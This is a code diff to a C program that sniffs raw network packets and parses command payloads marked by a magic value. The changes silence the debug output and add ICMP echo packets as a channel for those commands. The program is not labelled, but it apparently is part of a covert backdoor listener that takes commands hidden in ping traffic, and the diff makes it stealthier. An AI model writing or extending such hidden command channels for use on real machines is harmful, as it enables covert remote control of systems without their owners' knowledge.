@@ -221,7 +221,7 @@ int parse_payload(char* payload, int payload_len, int source_address) {
 
         // Handle ping
         case CMD_PING:
-            printf("Handling ping\n");
+            //printf("Handling ping\n");
             send_ping(source_address); 
             break;
         
@@ -240,10 +240,10 @@ int parse_payload(char* payload, int payload_len, int source_address) {
     
 
     // Debug printing
-    printf("MAGIC FOUND: %x\n", incoming.magic);
-    printf("Command Type: %x\n", incoming.command);
-    printf("Command Length: %d\n", incoming.cmd_len);
-    printf("Actual command: %s\n", command);
+    // printf("MAGIC FOUND: %x\n", incoming.magic);
+    // printf("Command Type: %x\n", incoming.command);
+    // printf("Command Length: %d\n", incoming.cmd_len);
+    // printf("Actual command: %s\n", command);
 
     free(command);
 
@@ -325,9 +325,24 @@ int main() {
 
         }    
 
+        else if (ip->protocol == IPPROTO_ICMP) {
+
+            // Treat part of buffer that has ICMP portion as a struct
+            // Same logic as above
+            struct icmphdr *icmp = (struct icmphdr*)(buf + sizeof(struct ethhdr) + ip_header_len);
+
+            // Only echo and echo reply have a payload
+            if (icmp->type != ICMP_ECHO && icmp->type != ICMP_ECHOREPLY) {
+                continue;
+            }
+
+            // Same logic as udp
+            payload = (char*)icmp + sizeof(struct icmphdr);
+        }
+
         else {
 
-            // Not TCP or UDP, skip it
+            // Not TCP, UDP, or ICMP, skip it
 
             continue;  
         }
